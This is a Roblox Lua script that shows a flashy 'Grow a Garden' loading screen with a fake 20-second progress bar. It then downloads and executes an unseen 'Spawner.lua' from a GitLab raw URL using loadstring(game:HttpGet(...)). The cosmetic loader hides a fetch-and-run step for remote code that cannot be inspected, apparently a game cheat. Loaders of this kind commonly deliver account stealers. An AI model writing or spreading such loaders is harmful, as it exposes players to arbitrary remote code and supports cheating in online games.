local TweenService = game:GetService("TweenService")
local Players = game:GetService("Players")
local player = Players.LocalPlayer

-- GUI Setup
local screenGui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
screenGui.Name = "GrowAGardenLoader"
screenGui.ResetOnSpawn = false
screenGui.IgnoreGuiInset = true

-- Main Frame
local mainFrame = Instance.new("Frame", screenGui)
mainFrame.Size = UDim2.new(0, 450, 0, 250)
mainFrame.Position = UDim2.new(0.5, -225, 0.5, -125)
mainFrame.BackgroundColor3 = Color3.new(0, 0, 0)
mainFrame.BorderSizePixel = 4
mainFrame.Active = true
mainFrame.Draggable = true

-- RGB Border
spawn(function()
	while true do
		for i = 0, 1, 0.01 do
			mainFrame.BorderColor3 = Color3.fromHSV(i, 1, 1)
			wait(0.03)
		end
	end
end)

-- Title
local title = Instance.new("TextLabel", mainFrame)
title.Size = UDim2.new(1, 0, 0.2, 0)
title.Position = UDim2.new(0, 0, 0, 10)
title.BackgroundTransparency = 1
title.Text = "★LOADING GROW A GARDEN SCRIPT★"
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.Font = Enum.Font.GothamBlack
title.TextScaled = true

-- Subtext
local subtext = Instance.new("TextLabel", mainFrame)
subtext.Size = UDim2.new(1, 0, 0.1, 0)
subtext.Position = UDim2.new(0, 0, 0.2, 0)
subtext.BackgroundTransparency = 1
subtext.Text = "Please wait..."
subtext.TextColor3 = Color3.fromRGB(200, 200, 200)
subtext.Font = Enum.Font.Gotham
subtext.TextScaled = true

-- Loading Bar Background
local barBG = Instance.new("Frame", mainFrame)
barBG.Size = UDim2.new(0.9, 0, 0.1, 0)
barBG.Position = UDim2.new(0.05, 0, 0.5, 0)
barBG.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
barBG.BorderSizePixel = 0

-- Loading Bar Fill
local barFill = Instance.new("Frame", barBG)
barFill.Size = UDim2.new(0, 0, 1, 0)
barFill.BackgroundColor3 = Color3.new(1, 0, 0)
barFill.BorderSizePixel = 0

-- RGB Tweening Bar Fill
spawn(function()
	while true do
		for i = 0, 1, 0.01 do
			barFill.BackgroundColor3 = Color3.fromHSV(i, 1, 1)
			wait(0.03)
		end
	end
end)

-- Status Message
local status = Instance.new("TextLabel", mainFrame)
status.Size = UDim2.new(1, 0, 0.1, 0)
status.Position = UDim2.new(0, 0, 0.65, 0)
status.BackgroundTransparency = 1
status.Text = "Loading..."
status.TextColor3 = Color3.fromRGB(255, 255, 255)
status.Font = Enum.Font.GothamBold
status.TextScaled = true

-- Credit Text
local credit = Instance.new("TextLabel", mainFrame)
credit.Size = UDim2.new(1, -10, 0.1, 0)
credit.Position = UDim2.new(0, 0, 0.9, -5)
credit.BackgroundTransparency = 1
credit.Text = "ScriptMade by: HANZSCRIPTS"
credit.TextColor3 = Color3.fromRGB(120, 120, 120)
credit.Font = Enum.Font.GothamSemibold
credit.TextScaled = true
credit.TextXAlignment = Enum.TextXAlignment.Right

-- Tween loading bar over 20 seconds
local duration = 20
local tween = TweenService:Create(barFill, TweenInfo.new(duration), {
	Size = UDim2.new(1, 0, 1, 0)
})
tween:Play()

-- Wait for tween to finish
task.delay(duration, function()
	status.Text = "SCRIPT LOADED!"

	-- Load external script
	local success, result = pcall(function()
		local Spawner = loadstring(game:HttpGet("https://gitlab.com/darkiedarkie/dark/-/raw/main/Spawner.lua"))()
		Spawner.Load()
	end)

	-- Optional: Wait a bit then remove GUI
	wait(2)
	screenGui:Destroy()
end)
